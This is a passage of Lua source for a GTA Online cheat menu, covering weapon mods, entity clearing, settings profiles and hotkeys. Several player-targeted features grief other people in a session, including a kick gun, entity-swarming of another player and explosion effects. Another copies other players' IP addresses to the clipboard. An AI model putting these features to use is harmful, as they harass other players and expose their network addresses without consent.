						local their_vehicle = player.get_player_vehicle(pid)
						network.request_control_of_entity(their_vehicle)
						vehicle.set_vehicle_forward_speed(their_vehicle, math.random(-150, 150))
					end
					system.yield(0)
					local time = utils.time_ms() + 5000
					while time > utils.time_ms() and f.on do
						system.yield(0)
						for i = 1, #hurricane_entities do
							if entity.is_an_entity(hurricane_entities[i]) then
								local hash = entity.get_entity_model_hash(hurricane_entities[i])
								if not table.get_index_of_value(entities_to_not_use, hash) then
									network.request_control_of_entity(hurricane_entities[i])
									entity.set_entity_coords_no_offset(hurricane_entities[i], player.get_player_coords(pid) + v3(math.random(-3, 3), math.random(-3, 3), math.random(-2, 2)))
								end
							else
								table.remove(hurricane_entities, i)
								break
							end
							random_wait(3)
						end
					end
				end
			end
		end)

-- Weapon stuff
	-- Give all weapons
		menu.add_feature(language["Give all weapons /;/feature|_|"], "action", u.weapons_self.id, function()
			local your_ped = player.get_player_ped(player.player_id())
			for i, weapon_hash in pairs(weapon.get_all_weapon_hashes()) do
				request_model(weapon_hash)
				weapon.give_delayed_weapon_to_ped(your_ped, weapon_hash, 0, 0)
				streaming.set_model_as_no_longer_needed(weapon_hash)
			end
		end)

	-- Max all weapons
		menu.add_feature(language["Max all weapons /;/feature|_|"], "action", u.weapons_self.id, function()
			for i, weapon_hash in pairs(weapon.get_all_weapon_hashes()) do
				set_ped_weapon_attachments(player.get_player_ped(player.player_id()), false, weapon_hash)
			end
		end)

	-- Randomize weapons
		menu.add_feature(language["Randomize all weapons /;/feature|_|"], "action", u.weapons_self.id, function()
			for i, weapon_hash in pairs(weapon.get_all_weapon_hashes()) do
				set_ped_weapon_attachments(player.get_player_ped(player.player_id()), true, weapon_hash)
			end
		end)

	-- Max weapon
		menu.add_feature(language["Max current weapon /;/feature|_|"], "action", u.weapons_self.id, function()
			local weapon_hash = ped.get_current_ped_weapon(player.get_player_ped(player.player_id()))
			if weapon_hash and weapon_hash ~= 2725352035 then
				set_ped_weapon_attachments(player.get_player_ped(player.player_id()), false, weapon_hash)
			else
				msg(language["You're not holding a weapon. /;/msg|_|"], 6, true)
			end
		end)

	-- Randomize weapon
		u.randomize_current_weapon = menu.add_feature(language["Randomize current weapon /;/feature|_|"], "action", u.weapons_self.id, function()
			local weapon_hash = ped.get_current_ped_weapon(player.get_player_ped(player.player_id()))
			if weapon_hash and weapon_hash ~= 2725352035 then
				set_ped_weapon_attachments(player.get_player_ped(player.player_id()), true, weapon_hash)
			else
				msg(language["You're not holding a weapon. /;/msg|_|"], 6, true)
			end
		end)

	-- Rainbow camo
		toggle[#toggle + 1] = {"Random weapon camos", menu.add_feature(language["Random weapon camo /;/feature|_|"], "toggle", u.weapons_self.id, function(f)
			setting["Random weapon camos"] = true
			while f.on do
				local Ped = player.get_player_ped(player.player_id())
				if Ped and entity.is_an_entity(Ped) and not entity.is_entity_dead(Ped) then
					local weapon_hash = ped.get_current_ped_weapon(Ped)
					local number_of_tints = weapon.get_weapon_tint_count(weapon_hash)
					if weapon_hash and weapon_hash ~= 2725352035 and number_of_tints > 0 then
						weapon.set_ped_weapon_tint_index(Ped, weapon_hash, math.random(1, number_of_tints))
					end
				end
				system.yield(1000)
			end
			setting["Random weapon camos"] = false
		end)}

	-- Give someone vehicle gun
		menu.add_player_feature(language["Vehicle gun /;/player feature|_|"], "toggle", u.pWeapons, function(f, pid)
			local their_ped = player.get_player_ped(pid)
			local e, s = {}
			while f.on and get_distance_between(their_ped, get_ped_closest_to_your_pov()) < 1000 do
				if txt.what_vehicle_model_in_use == "?" then
					s = 18
				else
					s = 8
				end
				if f.on and ped.is_ped_shooting(their_ped) then
					e[#e + 1] = spawn_entity(vehicle_mapper.GetHashFromModel(txt.what_vehicle_model_in_use, 669), get_vector_relative_to_entity(their_ped, s), player.get_player_heading(pid))
					entity.set_entity_coords_no_offset(e[#e], entity.get_entity_coords(e[#e]) + v3(0, 0, 2.5))
					if player.player_id() ~= pid then
						entity.set_entity_rotation(e[#e], entity.get_entity_rotation(their_ped))
					else
						entity.set_entity_rotation(e[#e], cam.get_gameplay_cam_rot())
					end
					vehicle.set_vehicle_forward_speed(e[#e], 120)
					if #e > 15 then
						clear_entities({e[1]}, 6000)
						table.remove(e, 1)
					end
				end
				system.yield(0)
			end
			clear_entities(e)
			f.on = false
		end)

	-- Player guns
		menu.add_player_feature(language["Kick gun /;/player feature|_|"], "toggle", u.pWeapons, function(f, pid)
			local Ped = player.get_player_ped(pid)
			while f.on and get_distance_between(Ped, get_ped_closest_to_your_pov()) < 1000 do
				system.yield(0)
				local player_target = player.get_entity_player_is_aiming_at(pid)
				if ped.is_ped_shooting(Ped) and ped.is_ped_a_player(player_target) then
					kick(player.get_player_from_ped(player_target))
				end
			end
		end)

		menu.add_player_feature(language["Delete gun /;/player feature|_|"], "toggle", u.pWeapons, function(f, pid)
			local Ped = player.get_player_ped(pid)
			while f.on and get_distance_between(Ped, get_ped_closest_to_your_pov()) < 1000 do
				system.yield(0)
				local e = player.get_entity_player_is_aiming_at(pid)
				if ped.is_ped_shooting(Ped) and entity.is_an_entity(e) then
					clear_entities({e})
				end
			end
		end)

		u.explosion_gun = menu.add_player_feature(language["Explosion gun /;/player feature|_|"], "toggle", u.pWeapons, function(f, pid)
			local Ped = player.get_player_ped(pid)
			while f.on and get_distance_between(Ped, get_ped_closest_to_your_pov()) < 1000 do
				if ped.is_ped_shooting(Ped) then
					local t, pos = ped.get_ped_last_weapon_impact(Ped)
					fire.add_explosion(pos, math.random(0, 73), true, false, 0, Ped)
				end
				system.yield(0)
			end
		end)

	-- Object gun
		menu.add_feature(language["Type in what object /;/feature|_|"], "action", u.weapons_self.id, function()
			txt.what_object = get_input(language["Type in what object to use. /;/input_does_not_support_unicode|_|"], "", 128, 0, "?"):lower()
			local a, b = object_mapper.GetHashFromModel(txt.what_object)
			if not b then
				msg(language["Invalid object. /;/msg|_|"], 6, true)
			end
		end)

		u.object_gun = menu.add_feature(language["Object gun /;/feature|_|"], "toggle", u.weapons_self.id, function(f)
			local e, my_ped = {}, player.get_player_ped(player.player_id())
			while f.on do
				local me = player.player_id()
				if ped.is_ped_shooting(my_ped) then
					e[#e + 1] = spawn_entity(object_mapper.GetHashFromModel(txt.what_object), get_vector_relative_to_entity(my_ped, 15))
					local pos = get_collision_vector(me, my_ped)
					entity.set_entity_rotation(e[#e], cam.get_gameplay_cam_rot())
					for i = 1, 10 do
						entity.apply_force_to_entity(e[#e], 3, pos.x, pos.y, pos.z, 0, 0, 0, true, true)
					end
					if #e > 10 then
						clear_entities({e[1]})
						table.remove(e, 1)
					end
				end
				system.yield(0)
			end
			clear_entities(e)
		end)

	-- Airstrike gun
		u.airstrike_gun = menu.add_feature(language["Airstrike gun /;/feature|_|"], "toggle", u.weapons_self.id, function(f)
			local Ped = player.get_player_ped(player.player_id())
			while f.on do
				system.yield(0)
				local m = player.player_id()
				if ped.is_ped_shooting(Ped) then
					local pos, d = get_collision_vector(m, Ped)
			    	gameplay.shoot_single_bullet_between_coords(pos + v3(0, 0, 15), pos, 1000, gameplay.get_hash_key("weapon_airstrike_rocket"), Ped, true, false, 250)
			    end
			end
		end)

	-- Vehicle gun
		menu.add_feature(language["What vehicle vehicle gun /;/feature|_|"], "action", u.weapons_self.id, function()
			txt.what_vehicle_model_in_use = get_input(language["Type in what car to use /;/input_does_not_support_unicode|_|"], "", 128, 0, setting["Default vehicle"]):lower()  
		end)

		u.self_vehicle_gun = menu.add_feature(language["Vehicle gun /;/feature|_|"], "toggle", u.weapons_self.id, function(f)
			local my_ped = player.get_player_ped(player.player_id())
			local e = {}; local s
			while f.on do
				if f.on and ped.is_ped_shooting(my_ped) then
					if txt.what_vehicle_model_in_use == "?" then
						s = 22
					else
						s = 8
					end
					e[#e + 1] = spawn_entity(vehicle_mapper.GetHashFromModel(txt.what_vehicle_model_in_use, 669), get_vector_relative_to_entity(my_ped, s), player.get_player_heading(player.player_id()))
					entity.set_entity_coords_no_offset(e[#e], entity.get_entity_coords(e[#e]) + v3(0, 0, 2.5))
					entity.set_entity_rotation(e[#e], cam.get_gameplay_cam_rot())
					vehicle.set_vehicle_forward_speed(e[#e], 120)
					if #e > 20 then
						clear_entities({e[1]}, 6000)
						table.remove(e, 1)
					end
				end
				system.yield(0)
			end
			clear_entities(e)
			f.on = false
		end)

-- Kek's utilities
	-- Clear entity type
		valuei["Entity type"] = {"Entity type", menu.add_feature(language["Entity type, click me for info /;/feature|_|"], "autoaction_value_i", u.kek_utilities.id, function(f)
			if controls.is_disabled_control_pressed(0, 215) then
				msg(language["1: Vehicles\\n2: Peds\\n3: Objects\\n4: Pickups\\n5: Peds & Vehicles\\n6: All /;/msg|_|"], 140, true)
			end
			setting["Entity type"] = f.value_i
		end)}
		valuei["Entity type"][2].max_i, valuei["Entity type"][2].min_i, valuei["Entity type"][2].mod_i = 6, 1, 1

		-- Clear distance settings
			valuei["Vehicle clear distance"] = {"Vehicle clear distance", menu.add_feature(language["Vehicle clear distance /;/feature|_|"], "autoaction_value_i", u.kek_utilities.id, function(f)
				if controls.is_disabled_control_pressed(0, 215) then
					local v = get_input(language["Type in clear distance limit. /;/input_does_not_support_unicode|_|"], "", 5, 3, setting["Vehicle clear distance"])
					value_i_setup(f, v)
				end
				setting["Vehicle clear distance"] = f.value_i
			end)}
			valuei["Vehicle clear distance"][2].max_i, valuei["Vehicle clear distance"][2].min_i, valuei["Vehicle clear distance"][2].mod_i = 20000, 1, 10

			valuei["Ped clear distance"] = {"Ped clear distance", menu.add_feature(language["Ped clear distance /;/feature|_|"], "autoaction_value_i", u.kek_utilities.id, function(f)
				if controls.is_disabled_control_pressed(0, 215) then
					local v = get_input(language["Type in clear distance limit. /;/input_does_not_support_unicode|_|"], "", 5, 3, setting["Ped clear distance"])
					value_i_setup(f, v)
				end
				setting["Ped clear distance"] = f.value_i
			end)}
			valuei["Ped clear distance"][2].max_i, valuei["Ped clear distance"][2].min_i, valuei["Ped clear distance"][2].mod_i = 20000, 1, 10

			valuei["Object clear distance"] = {"Object clear distance", menu.add_feature(language["Object clear distance /;/feature|_|"], "autoaction_value_i", u.kek_utilities.id, function(f)
				if controls.is_disabled_control_pressed(0, 215) then
					local v = get_input(language["Type in clear distance limit. /;/input_does_not_support_unicode|_|"], "", 5, 3, setting["Object clear distance"])
					value_i_setup(f, v)
				end
				setting["Object clear distance"] = f.value_i
			end)}
			valuei["Object clear distance"][2].max_i, valuei["Object clear distance"][2].min_i, valuei["Object clear distance"][2].mod_i = 20000, 1, 10

			valuei["Pickup clear distance"] = {"Pickup clear distance", menu.add_feature(language["Pickup clear distance /;/feature|_|"], "autoaction_value_i", u.kek_utilities.id, function(f)
				if controls.is_disabled_control_pressed(0, 215) then
					local v = get_input(language["Type in clear distance limit. /;/input_does_not_support_unicode|_|"], "", 5, 3, setting["Pickup clear distance"])
					value_i_setup(f, v)
				end
				setting["Pickup clear distance"] = f.value_i
			end)}
			valuei["Pickup clear distance"][2].max_i, valuei["Pickup clear distance"][2].min_i, valuei["Pickup clear distance"][2].mod_i = 20000, 1, 10

		u.clear_entities = menu.add_feature(language["Clear entity type /;/feature|_|"], "toggle", u.kek_utilities.id, function(f)
			while f.on do
				local entities = {}
				if valuei["Entity type"][2].value_i == 1 or valuei["Entity type"][2].value_i == 5 or valuei["Entity type"][2].value_i == 6 then
					entities[#entities + 1] = 
					{
						get_table_of_close_entity_type(1),
						nil,
						false,
						valuei["Vehicle clear distance"][2].value_i
					}
				end
				if valuei["Entity type"][2].value_i == 2 or valuei["Entity type"][2].value_i == 5 or valuei["Entity type"][2].value_i == 6 then
					entities[#entities + 1] = 
					{
						get_table_of_close_entity_type(2),
						nil,
						false,
						valuei["Ped clear distance"][2].value_i
					}
				end
				if valuei["Entity type"][2].value_i == 3 or valuei["Entity type"][2].value_i == 6 then
					entities[#entities + 1] = 
					{
						get_table_of_close_entity_type(3),
						50,
						false,
						valuei["Object clear distance"][2].value_i
					}
				end
				if valuei["Entity type"][2].value_i == 4 or valuei["Entity type"][2].value_i == 6 then
					entities[#entities + 1] = 
					{
						get_table_of_close_entity_type(4),
						30,
						false,
						valuei["Pickup clear distance"][2].value_i
					}
				end
				clear_entities(get_table_of_entities_with_respect_to_distance_and_set_limit(entities, get_ped_closest_to_your_pov()), 1)
				system.yield(0)
			end
		end)

	-- Find model name
		menu.add_feature(language["Shoot entity| get model name of entity /;/feature|_|"], "toggle", u.kek_utilities.id, function(f)
			local Ped, hash = player.get_player_ped(player.player_id())
			while f.on do
				if ped.is_ped_shooting(Ped) then
					local e = entity.get_entity_model_hash(player.get_entity_player_is_aiming_at(player.player_id()))
					if streaming.is_model_an_object(e) then
						hash = object_mapper.GetModelFromHash(e)
					elseif streaming.is_model_a_ped(e) then
						hash = pedestrian_mapper.GetModelFromHash(e)
					else
						hash = vehicle_mapper.GetModelFromHash(e)
					end
					utils.to_clipboard(tostring(hash))
				end
				if hash and hash ~= 0 then
					msg(language["This model is called: /;/msg|_|"].." "..hash, 140, true)
					hash = 0
					system.yield(250)
				end
				system.yield(0)
			end
		end)

	-- Copy rid to clipboard
		menu.add_player_feature(language["Copy rid to clipboard /;/player feature|_|"], "action", u.p_utilities, function(f, pid)
			utils.to_clipboard(tostring(player.get_player_scid(pid)))
		end)

	-- Copy host token to clipboard
		menu.add_player_feature(language["Copy host token to clipboard /;/player feature|_|"], "action", u.p_utilities, function(f, pid)
			utils.to_clipboard(dec_to_hex(player.get_player_host_token(pid)))
		end)

	-- Copy position to clipboard
		menu.add_player_feature(language["Copy position with decimals to clipboard /;/player feature|_|"], "action", u.p_utilities, function(f, pid)
			utils.to_clipboard(string.gsub(string.gsub(tostring(player.get_player_coords(pid)), "v3%(", ""), "%)", ""))
		end)

		menu.add_player_feature(language["Copy position without decimal to clipboard /;/player feature|_|"], "action", u.p_utilities, function(f, pid)
			local pos = player.get_player_coords(pid)
			utils.to_clipboard(tostring(math.round(pos.x)..", "..math.round(pos.y)..", "..math.round(pos.z)))
		end)

	-- Copy ip to clipboard
		menu.add_player_feature(language["Copy ip to clipboard /;/player feature|_|"], "action", u.p_utilities, function(f, pid)
			utils.to_clipboard(get_ip_in_ipv4(pid))
		end)

	-- Save all player stats to file
		menu.add_player_feature(language["Save all their stats to file /;/player feature|_|"], "action", u.p_utilities, function(f, pid)
			local stats = globals.get_all_stats(pid)
			local file = io.open(o.kek_menu_stuff_path.."Player stats\\"..player.get_player_name(pid)..".log", "w+")
			for i, k in pairs(stats) do
				file:write(k.."\n")
			end
			file:flush()
			file:close()
			msg(language["Saved their stats to a file. /;/msg|_|"], 210, true)
			msg("kek_menu_stuff\\Player stats\\"..player.get_player_name(pid)..".log", 212, true)
		end)

-- Initialize settings
	local function setting_file_valid_test(file_name, text)
		if utils.file_exists(o.kek_menu_stuff_path..file_name) then
			for i, setting_name in pairs(setting_names) do
				log("scripts\\kek_menu_stuff\\"..file_name, setting_name.."="..tostring(setting[setting_name]), {setting_name})	
			end
		else
			local file = io.open(o.kek_menu_stuff_path..file_name, "w+")
			for i, setting_name in pairs(setting_names) do
				file:write(setting_name.."="..tostring(setting[setting_name]).."\n")
			end
			file:flush()
			file:close()
		end
		modify_entry("scripts\\kek_menu_stuff\\"..file_name, {general_settings[1][1].."=", general_settings[1][1].."="..general_settings[1][2]}, false, true)
	end
	setting_file_valid_test("keksettings.ini", true)
	for i, setting_name in pairs(general_settings) do
		if setting_name[1]:find("#notifications#") then
			toggle[#toggle + 1] = {setting_name[1], menu.add_feature(setting_name[3], "toggle", u.notifSettings.id, function(f)
				if f.on then 
					setting[setting_name[1]] = true 
				else
					setting[setting_name[1]] = false 
				end
			end)}
		end
	end

	local function initialize_settings(file_path)
		local str = get_file_string(file_path, "*a")
		for setting_in_file in str:gmatch("([^\n]*)\n?") do
			local name = setting_in_file:match("(.*)=")
			local setting_in_file = setting_in_file:match("=(.*)")
			if tonumber(setting_in_file) and type(setting[name]) == "number" then
				setting_in_file = tonumber(setting_in_file)
			elseif setting_in_file == "true" and type(setting[name]) == "boolean" then
				setting_in_file = true
			elseif setting_in_file == "false" and type(setting[name]) == "boolean" then
				setting_in_file = false
			elseif not setting_in_file or #setting_in_file == 0 then
				setting_in_file = setting[name]
			end
			if type(setting_in_file) ~= type(setting[name]) then
				setting_in_file = setting[name]
				print("INVALID SETTING, "..name.." IS SET TO DEFAULT.")
			end
			setting[name] = setting_in_file
	    end
		local file = io.open(o.home..file_path, "w+")
		for i, setting_name in pairs(setting_names) do
			file:write(setting_name.."="..tostring(setting[setting_name]).."\n")
		end
		file:flush()
		file:close()
	    for i, setting_name in pairs(toggle) do
	    	setting_name[2].on = setting[setting_name[1]]
	    end
	    for i, setting_name in pairs(valuei) do
	    	setting_name[2].value_i = setting[setting_name[1]]
	    end
	end

	local function initialize_hotkey_settings()
	   for i, profile in pairs(hotkey_features) do
	    	if (setting["Controller hotkey mode"] and key_mapper.get_controller_key_control_int_from_name(setting[profile[3]]) ~= -1) or (not setting["Controller hotkey mode"] and key_mapper.get_keyboard_key_control_int_from_name(setting[profile[3]]) ~= -1) then
	    		profile[2].name = profile[1]..": "..setting[profile[3]]
	    	else
	    		profile[2].name = profile[1]..": "..language["Turned off /;/feature|_|"]
	    		setting[profile[3]] = "TURNED OFF!"
	    	end
	    end
	end

-- Setting files
	local function save_settings(file_name)
		system.yield(2200)
		local file = io.open(o.kek_menu_stuff_path..file_name, "w+")
		for i, setting_name in pairs(setting_names) do
			file:write(setting_name.."="..tostring(setting[setting_name]).."\n")
		end
		file:flush()
		file:close()
	end

	local profile_names = {}
	local str = get_file_string("scripts\\kek_menu_stuff\\kekMenuData\\profile names.ini", "*a")
	for profile_name_from_file in str:gmatch("([^\n]*)\n?") do
		profile_names[#profile_names + 1] = profile_name_from_file
	end
	local profiles = {}
	menu.add_feature(language["Save settings to default /;/feature|_|"], "action", u.profiles.id, function()
		save_settings("keksettings.ini")
		msg(language["Settings saved! /;/msg|_|"], 210, true)
	end)	
	menu.add_feature(language["1 = Load profile /;/feature|_|"], "action", u.profiles.id)
	menu.add_feature(language["2 = Overwrite/save profile /;/feature|_|"], "action", u.profiles.id)
	menu.add_feature(language["3 = Change profile name /;/feature|_|"], "action", u.profiles.id)
	for i = 1, 10 do
		profiles[i] = menu.add_feature(profile_names[i]:match("&|<<>.,(.*)&|<<>.,"), "action_value_i", u.profiles.id, function(f)
			if f.value_i == 1 then
				local s = o.kek_menu_stuff_path.."profiles\\profile "..i..".ini"
				if utils.file_exists(s) then
					setting_file_valid_test("profiles\\profile "..i..".ini", true)
					initialize_settings("scripts\\kek_menu_stuff\\profiles\\profile "..i..".ini")
					initialize_hotkey_settings()
					msg(language["Successfully loaded /;/msg|_|"].." "..profile_names[i]:match("&|<<>.,(.*)&|<<>.,")..".", 210, true)
				else
					msg(language["The setting file doesn't exist.\\nPlease save to this slot in order to use it. /;/msg|_|"], 6, true)
				end
			elseif f.value_i == 2 then
				save_settings("profiles\\profile "..i..".ini")
				msg(language["Saved /;/msg|_|"].." "..profile_names[i]:match("&|<<>.,(.*)&|<<>.,")..".", 212, true)
			elseif f.value_i == 3 then
				local Name = get_input(language["Type in the name of the profile. /;/input_does_not_support_unicode|_|"], "", 128, 0) 
				if #Name == 0 then
					msg(language["Invalid name. /;/msg|_|"], 6, true)
					return
				end
				if modify_entry("scripts\\kek_menu_stuff\\kekMenuData\\profile names.ini", {profile_names[i], Name}, true, true, true) == 1 then
					f.name = Name
					msg(language["Saved profile name. /;/msg|_|"], 212, true)
					profile_names = {}
					local str = get_file_string("scripts\\kek_menu_stuff\\kekMenuData\\profile names.ini", "*a")
					for profile_name_from_file in str:gmatch("([^\n]*)\n?") do
						profile_names[#profile_names + 1] = profile_name_from_file
					end
				else
					msg(language["Failed to save profile name. /;/msg|_|"], 6, true)
				end
			end
		end)
		profiles[i].max_i, profiles[i].min_i, profiles[i].value_i, profiles[i].mod_i = 3, 1, 1, 1
	end

-- Keybindings
	local function switch(v, t)
		if not v.on then
			v.on = true
			msg(language["Hotkey:\\nTurned on /;/msg|_|"].." "..t, 140, setting["Hotkeys #notifications#"]) 
		else
			v.on = false
			msg(language["Hotkey:\\nTurned off /;/msg|_|"].." "..t, 140, setting["Hotkeys #notifications#"]) 
		end
	end
	local Temp = #general_settings
	table.merge
	(
		general_settings,
		{
			{
				{
					"Randomize current weapon #keybinding#",
					"TURNED OFF!",
					function()
						u.randomize_current_weapon.on = true
						msg(language["Hotkey:\\nRandomized current weapon. /;/msg|_|"], 140, setting["Hotkeys #notifications#"])
					end,
					language["Randomize current weapon /;/feature|_|"]
				},
				{
					"Max vehicle #keybinding#", 
					"TURNED OFF!", 
					function() 
						max_car(player.get_player_vehicle(player.player_id()))
						msg(language["Hotkey:\\nMaxed vehicle. /;/msg|_|"], 140, setting["Hotkeys #notifications#"])
					end,
					language["Max vehicle /;/hotkey|_|"]
				},
				{
					"Spawn vehicle #keybinding#", 
					"TURNED OFF!",
					function() 
						spawn_car()
						msg(language["Hotkey:\\nSpawned vehicle. /;/msg|_|"], 140, setting["Hotkeys #notifications#"])
					end,
					language["Spawn vehicle /;/hotkey|_|"]
				},
				{
					"Repair vehicle #keybinding#", 
					"TURNED OFF!",
					function() 
						vehicle.set_vehicle_fixed(player.get_player_vehicle(player.player_id()))
						msg(language["Hotkey:\\nRepaired vehicle. /;/msg|_|"], 140, setting["Hotkeys #notifications#"])
					end,
					language["Repair vehicle /;/hotkey|_|"]
				}, 
				{
					"Vehicle fly #keybinding#", 
					"TURNED OFF!",
					function()
						switch(u.vehicle_fly, language["vehicle fly. /;/msg|_|"])
					end,
					language["Vehicle fly /;/hotkey|_|"]
				},
				{
					"Vehicle gun #keybinding#", 
					"TURNED OFF!",
					function()
						switch(u.self_vehicle_gun, language["vehicle gun. /;/msg|_|"])
					end,
					language["Vehicle gun /;/hotkey|_|"]
				},
				{
					"Airstrike gun #keybinding#", 
					"TURNED OFF!",
					function()
						switch(u.airstrike_gun, language["airstrike gun. /;/msg|_|"])
					end,
					language["Airstrike gun /;/hotkey|_|"]
				},
				{
					"Change vehicle used for vehicle stuff #keybinding#", 
					"TURNED OFF!",
					function()
						txt.what_vehicle_model_in_use = get_input(language["Type in which car to use for vehicle stuff. /;/input_does_not_support_unicode|_|"], "", 128, 0, setting["Default vehicle"]):lower() 
					end,
					language["Change vehicle used for vehicle stuff /;/hotkey|_|"]
				},
				{
					"Tag / untag session #keybinding#", 
					"TURNED OFF!",
					function() 
						for pid = 0, 31 do
							if player.is_player_valid(pid) and not player.is_player_modder(pid, -1) then
								player.set_player_as_modder(pid, 1)
							elseif player.is_player_valid(pid) and player.get_player_modder_flags(pid) == 1 then
								player.unset_player_as_modder(pid, 1)
							end
						end
						msg(language["Hotkey:\\nTagged non modders & untagged modders with manual tag. /;/msg|_|"], 140, setting["Hotkeys #notifications#"])
					end,
					language["Tag / untag session /;/hotkey|_|"]
				},
				{
					"Disconnect from session #keybinding#", 
					"TURNED OFF!",
					function()
						msg(language["Hotkey:\\nDisconnected you from session. /;/msg|_|"], 140, setting["Hotkeys #notifications#"])
						u.disconnect.on = true
					end,
					language["Disconnect from session /;/hotkey|_|"]
				},
				{
					"Clear entity type #keybinding#", 
					"TURNED OFF!",
					function()
						switch(u.clear_entities, language["Clear entity type. /;/msg|_|"])
					end,
					language["Clear entity type /;/hotkey|_|"]
				},
				{
					"Increase vehicle fly speed #keybinding#", 
					"TURNED OFF!",
					function()
						valuei["Vehicle fly speed"][2].value_i = valuei["Vehicle fly speed"][2].value_i + valuei["Vehicle fly speed"][2].mod_i
						setting["Vehicle fly speed"] = valuei["Vehicle fly speed"][2].value_i
						msg(language["Hotkey:\\nIncreased vehicle fly speed. /;/msg|_|"], 140, setting["Hotkeys #notifications#"])
					end,
					language["Increase vehicle fly speed /;/hotkey|_|"]
				},
				{
					"Decrease vehicle fly speed #keybinding#", 
					"TURNED OFF!",
					function()
						valuei["Vehicle fly speed"][2].value_i = valuei["Vehicle fly speed"][2].value_i - valuei["Vehicle fly speed"][2].mod_i
						setting["Vehicle fly speed"] = valuei["Vehicle fly speed"][2].value_i
						msg(language["Hotkey:\\nDecreased vehicle fly speed. /;/msg|_|"], 140, setting["Hotkeys #notifications#"])
					end,
					language["Decrease vehicle fly speed /;/hotkey|_|"]
				}
			}
		}
	)

	for i = 1, 10 do
		general_settings[#general_settings + 1] = 
		{
			"profile "..i.." #keybinding#",
			"TURNED OFF!",
			function()
				initialize_settings("scripts\\kek_menu_stuff\\profiles\\profile "..i..".ini")
				initialize_hotkey_settings()
				msg(language["Hotkey:\\nloaded /;/msg|_|"].." "..profile_names[i]:match("&|<<>.,(.*)&|<<>.,")..".", 212, true)
			end,
			language["Load profile /;/feature|_|"].." "..profile_names[i]:match("&|<<>.,(.*)&|<<>.,")
		}
	end
	for i = Temp + 1, #general_settings do
		setting_names[#setting_names + 1] = general_settings[i][1]
		setting[setting_names[#setting_names]] = general_settings[i][2]
	end

	toggle[#toggle + 1] = {"Controller hotkey mode", menu.add_feature(language["Set controller hotkeys /;/feature|_|"], "toggle", u.hotkey_settings.id, function(f)
		if f.on then
			setting["Controller hotkey mode"] = true
			hotkey_control_keys_update = true
		else
			setting["Controller hotkey mode"] = false
			hotkey_control_keys_update = true
		end
	end)}

	toggle[#toggle + 1] = {"hotkeys", menu.add_feature(language["Enable hotkeys /;/feature|_|"], "toggle", u.hotkey_settings.id, function(f)
		setting["hotkeys"] = true
		local hotkey_control_keys, hotkey_functions, controller_group
		while f.on do
			system.yield(0)
			if hotkey_control_keys_update then
				hotkey_control_keys = {}
				hotkey_functions = {}
				for i, setting_name in pairs(general_settings) do
					if setting_name[1]:find("#keybinding#") then
						hotkey_control_keys[#hotkey_control_keys + 1] = key_mapper.get_keyboard_key_control_int_from_name(setting[setting_name[1]])
						hotkey_functions[#hotkey_functions + 1] = setting_name[3]
					end
				end
				controller_group = 0
				if setting["Controller hotkey mode"] then
					controller_group = 2
				end 
				hotkey_control_keys_update = false
			end
			for i = 1, #hotkey_control_keys do
				if controls.is_control_just_pressed(controller_group, hotkey_control_keys[i]) then
					hotkey_functions[i]()
					do_key(controller_group, hotkey_control_keys[i], 550)
					while controls.is_disabled_control_pressed(controller_group, hotkey_control_keys[i]) do
						hotkey_functions[i]()
						system.yield(80)
					end
				end
			end
		end
		setting["hotkeys"] = false
	end)}
	initialize_settings("scripts\\kek_menu_stuff\\keksettings.ini")

	for i, setting_name in pairs(general_settings) do
		if setting_name[1]:find("#keybinding#") then
			local key_name
			if setting[setting_name[1]] ~= "TURNED OFF!" then
				key_name = setting[setting_name[1]]
			else
				key_name = language["Turned off /;/feature|_|"]
			end
			local name = setting_name[1]
			hotkey_features[#hotkey_features + 1] = {setting_name[4], menu.add_feature("", "action", u.hotkey_settings.id, function(f)
				msg(language["Press key to set to hotkey.\\nTo turn off hotkey, press f4. /;/msg|_|"], 212, true)
				do_key(0, 215, 5000)
				local keys
				if setting["Controller hotkey mode"] then
					keys = key_mapper.get_all_controller_keys()
				else
					keys = key_mapper.get_all_keyboard_keys()
				end
				local time = utils.time_ms() + 10000
				while time > utils.time_ms() do
					system.yield(0)
					for i, key in pairs(keys) do
						local bind = MenuKey()
						bind:push_str("f4")
						if bind:is_down() then
							setting[name] = "TURNED OFF!"
							msg(language["Turned off the hotkey:\\n /;/msg|_|"].." "..setting_name[4]..".", 210, true)
							f.name = setting_name[4]..": "..language["Turned off /;/feature|_|"]
							hotkey_control_keys_update = true
							return
						elseif controls.is_control_pressed(key[3], key[2]) then
							do_key(key[3], key[2], 5000)
							msg(language["Changed /;/msg|_|"].." "..setting_name[4].." "..language["to /;/msg|_|"].." "..key[1]..".", 212, true)
							setting[name] = key[1]
							f.name = setting_name[4]..": "..key[1]
							hotkey_control_keys_update = true
							return
						end
					end
				end
			end), setting_name[1]}
		end
	end
	initialize_hotkey_settings()

-- Event listener clean-up on exit 
	event.add_event_listener("exit", function()
		if u.check_if_player_is_in_blacklist then 
			event.remove_event_listener("player_join", u.check_if_player_is_in_blacklist) 
		end
		if u.chat_judge_listener then 
			event.remove_event_listener("chat", u.chat_judge_listener) 
		end
		if u.echo_chat then 
			event.remove_event_listener("chat", u.echo_chat) 
		end
		if u.kek_chat_bot_listener then
			event.remove_event_listener("chat", u.kek_chat_bot_listener)
		end
		hook.remove_net_event_hook(temp.net_hook)
		if u.script_hook then
			hook.remove_script_event_hook(u.script_hook)
		end
		for i, entity_table in pairs(blocking_objects) do
			if type(entity_table) == "table" then
				for i, Entity in pairs(entity_table) do
					entity.delete_entity(Entity)
				end
			end
		end
	end) 

-- After successful load
	collectgarbage("setpause", 100)
	msg(language["Successfully loaded Kek's menu. /;/msg|_|"], math.random(1, 140), true)